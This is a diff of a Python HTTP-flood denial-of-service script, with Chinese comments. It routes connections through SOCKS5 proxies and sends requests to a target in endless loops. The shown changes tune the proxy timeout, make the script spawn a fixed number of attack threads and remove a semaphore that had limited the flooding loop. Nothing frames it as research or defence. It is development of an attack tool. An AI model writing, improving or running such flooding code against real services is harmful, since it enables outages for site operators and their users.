@@ -134,7 +134,7 @@ def check_proxy(proxy): # 檢測proxy的TCP connection跟HTTP REQUESTS
 
     s = socks.socksocket()
     s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
-    s.settimeout(1)
+    s.settimeout(5)
 
     try:
         s.connect((host, port))
@@ -362,8 +362,7 @@ def joinThreads():
 
 
 def launchThreads():
-    threading.Thread(target=joinThreads, daemon=True).start()
-    while 1:
+    for _ in range(thr):
         try:
             if version == "http":
                 t = threading.Thread(target=send_requests)
@@ -436,7 +435,6 @@ def send_requests(): #傳統HTTP FLOOD
     else:
         header = headerHandle()
     header += f'\r\n'
-    sema.acquire()
     while 1:
         try:
             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -458,8 +456,6 @@ def send_requests(): #傳統HTTP FLOOD
                 s.close()
         except:
             s.close()
-    sema.release()
-    return
 
 
 if __name__ == '__main__':
